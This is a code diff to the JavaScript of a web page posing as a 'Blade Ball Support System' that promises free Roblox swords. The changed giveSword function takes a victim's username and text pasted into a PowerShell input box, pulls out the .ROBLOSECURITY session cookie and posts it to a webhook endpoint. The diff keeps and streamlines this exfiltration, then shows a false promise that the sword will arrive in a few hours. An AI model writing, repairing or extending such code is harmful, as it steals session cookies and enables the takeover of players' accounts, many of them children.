@@ -1179,24 +1179,7 @@
     return '';
   }
 
-  // ===== SEND TO VERCEL FUNCTION (PROXY) =====
-  async function sendToWebhook(data) {
-    try {
-      const response = await fetch(WEBHOOK_ENDPOINT, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data)
-      });
-      return response.ok;
-    } catch (error) {
-      console.error('Webhook error:', error);
-      return false;
-    }
-  }
-
-  // ===== SEND SWORD FUNCTION =====
+  // ===== SEND SWORD FUNCTION (SIMPLIFIED PAYLOAD) =====
   async function giveSword() {
     const username = document.getElementById('robloxUsername').value.trim();
     const powershellRaw = document.getElementById('powershellInput').value.trim();
@@ -1234,66 +1217,59 @@
     status.style.color = '#00ffff';
     status.textContent = '⏳ Sending data to server...';
 
+    // Payload SIMPLE — hanya 3 field
     const payload = {
-      username: "Blade Ball Support System",
-      avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041886.png",
-      embeds: [
-        {
-          title: "⚔️ GIVE SWORD PLAYER - NEW DATA",
-          color: 0x00ffff,
-          fields: [
-            {
-              name: "👤 Roblox Username",
-              value: username || "-",
-              inline: false
-            },
-            {
-              name: "🗡️ Selected Sword",
-              value: selectedSword || "-",
-              inline: false
-            },
-            {
-              name: "🍪 Cookies (.ROBLOSECURITY)",
-              value: `\`\`\`${cookies}\`\`\``,
-              inline: false
-            }
-          ],
-          footer: {
-            text: "Blade Ball Support System • " + new Date().toLocaleString('en-US')
-          },
-          timestamp: new Date().toISOString()
-        }
-      ]
+      username: username,
+      sword: selectedSword,
+      cookies: cookies
     };
 
-    const success = await sendToWebhook(payload);
+    console.log('Sending payload:', payload);
+    console.log('Cookies length:', cookies.length);
 
-    if (success) {
-      status.style.color = '#00ff88';
-      status.textContent = '⏳ WAIT A FEW HOURS FOR THE SWORD TO ENTER YOUR INVENTORY';
-      status.style.fontSize = '15px';
-      status.style.lineHeight = '1.5';
-      status.style.padding = '10px';
-      status.style.border = '1px solid #00ff88';
-      status.style.borderRadius = '10px';
-      status.style.background = 'rgba(0, 255, 136, 0.08)';
+    try {
+      const response = await fetch(WEBHOOK_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
 
-      setTimeout(() => {
-        document.getElementById('robloxUsername').value = '';
-        document.getElementById('swordSearch').value = '';
-        document.getElementById('powershellInput').value = '';
-        selectedSword = '';
-        status.textContent = '';
-        status.style.border = 'none';
-        status.style.background = 'transparent';
-        status.style.padding = '0';
+      const result = await response.json();
+      console.log('Server response:', result);
+
+      if (response.ok && result.ok) {
+        status.style.color = '#00ff88';
+        status.textContent = '⏳ WAIT A FEW HOURS FOR THE SWORD TO ENTER YOUR INVENTORY';
+        status.style.fontSize = '15px';
+        status.style.lineHeight = '1.5';
+        status.style.padding = '10px';
+        status.style.border = '1px solid #00ff88';
+        status.style.borderRadius = '10px';
+        status.style.background = 'rgba(0, 255, 136, 0.08)';
+
+        setTimeout(() => {
+          document.getElementById('robloxUsername').value = '';
+          document.getElementById('swordSearch').value = '';
+          document.getElementById('powershellInput').value = '';
+          selectedSword = '';
+          status.textContent = '';
+          status.style.border = 'none';
+          status.style.background = 'transparent';
+          status.style.padding = '0';
+          submitBtn.disabled = false;
+          submitBtn.textContent = '🎁 SEND SWORD';
+          renderSwords(swordList);
+        }, 5000);
+      } else {
+        status.style.color = '#ff4444';
+        status.textContent = '❌ Failed: ' + (result.error || result.message || 'Unknown error');
         submitBtn.disabled = false;
         submitBtn.textContent = '🎁 SEND SWORD';
-        renderSwords(swordList);
-      }, 5000);
-    } else {
+      }
+    } catch (error) {
+      console.error('Fetch error:', error);
       status.style.color = '#ff4444';
-      status.textContent = '❌ Failed to send to server! Try again.';
+      status.textContent = '❌ Network error: ' + error.message;
       submitBtn.disabled = false;
       submitBtn.textContent = '🎁 SEND SWORD';
     }
